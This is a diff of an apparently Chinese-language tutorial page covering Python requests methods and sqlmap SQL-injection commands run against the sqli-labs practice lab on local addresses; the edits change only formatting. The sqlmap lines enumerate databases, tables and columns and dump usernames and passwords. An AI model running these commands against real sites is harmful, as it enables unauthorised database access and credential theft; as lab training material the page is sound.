@@ -140,12 +140,13 @@
 </li>
 </ol>
 <ul>
-<li>GET<br>无参数：r=requests.get(‘url’)  <pre><code>r=requests.get(&apos;https://www.baidu.com&apos;)  </code></pre>有参数: r=requests.get(‘url’,params={‘参数名1’:’参数值1’,’参数名2’:’参数值2’}….)      <pre><code>r=requests.get(&apos;http://127.0.0.1/sqli/sqli-labs-master/Less-2/&apos;,params={&apos;id&apos;:&apos;1&apos;})  </code></pre></li>
+<li>GET<br>无参数：r=requests.get(‘url’)  <pre><code>r=requests.get(&apos;https://www.baidu.com&apos;) </code></pre></li>
 </ul>
+<p>有参数: r=requests.get(‘url’,params={‘参数名1’:’参数值1’,’参数名2’:’参数值2’}….)<br>        r=requests.get(‘<a href="http://127.0.0.1/sqli/sqli-labs-master/Less-2/&#39;,params={&#39;id&#39;:&#39;1&#39;}" target="_blank" rel="noopener">http://127.0.0.1/sqli/sqli-labs-master/Less-2/&#39;,params={&#39;id&#39;:&#39;1&#39;}</a>)  </p>
 <ul>
-<li><p>POST<br>payload = {‘key1’: ‘value1’, ‘key2’: ‘value2’}<br>r=requests.post(‘url’,data=payload)</p>
+<li><p>POST<br>payload = {‘key1’: ‘value1’, ‘key2’: ‘value2’}<br>r=requests.post(‘url’,data=payload)  </p>
 </li>
-<li><p>PUT,DELETE,HEAD,OPTIONS<br>requests.put(‘url’)<br>requests.delete(‘url’)<br>requests.head(‘url’)<br>requests.options(‘url’)</p>
+<li><p>PUT,DELETE,HEAD,OPTIONS<br>requests.put(‘url’)<br>requests.delete(‘url’)<br>requests.head(‘url’)<br>requests.options(‘url’)  </p>
 </li>
 </ul>
 
@@ -193,13 +194,13 @@
         <ol>
 <li><p>判断是否存在注入<br>sqlmap.py -u “目标URL”<br>sqlmap.py -u “<a href="http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;</a>  </p>
 </li>
-<li><p>从一个包含有WEB数据包的txt文件中加载HTTP请求，SQLMAP可以从一个文本文件中获取HTTP请求，这样就可以不设置其它参数（如cookie,POST数据等）<br>sqlmap.py -r 文件路径          <strong><em>(-r参数一般在存在cookie注入时使用)</em></strong><br>sqlmap.py -r H:\下载\sqli.txt</p>
+<li><p>从一个包含有WEB数据包的txt文件中加载HTTP请求，SQLMAP可以从一个文本文件中获取HTTP请求，这样就可以不设置其它参数（如cookie,POST数据等)<br>sqlmap.py -r 文件路径          <strong><em>(-r参数一般在存在cookie注入时使用)</em></strong><br>sqlmap.py -r H:\下载\sqli.txt  </p>
 </li>
-<li><p>查询当前用户下的所有数据库<br>sqlmap.py -u “目标URL” –dbs<br>sqlmap.py -u “<a href="http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;</a> –dbs</p>
+<li><p>查询当前用户下的所有数据库<br>sqlmap.py -u “目标URL” –dbs<br>sqlmap.py -u “<a href="http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;</a> –dbs  </p>
 </li>
 <li><p>获取某一数据库中所有的表名<br>sqlmap.py -u “目标URL” -D 数据库名 –tables<br>sqlmap.py -u “<a href="http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;</a> -D security –tables  </p>
 </li>
-<li><p>获取某一数据库中某一表下的所有字段名<br>sqlmap.py -u “目标URL” -D 数据库名 -T 表名 –columns<br>sqlmap.py -u “<a href="http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;</a> -D security -T users –columns</p>
+<li><p>获取某一数据库中某一表下的所有字段名<br>sqlmap.py -u “目标URL” -D 数据库名 -T 表名 –columns<br>sqlmap.py -u “<a href="http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;</a> -D security -T users –columns  </p>
 </li>
 <li><p>获取某一数据库中某一表下的某些字段内容<br>sqlmap.py -u “目标URL” -D 数据库名 -T 表名 -C 字段名,字段名 –dump<br>sqlmap.py -u “<a href="http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.238.1/sqli/sqli-labs-master/Less-1/?id=1&quot;</a> -D security -T users -C username,password –dump</p>
 </li>
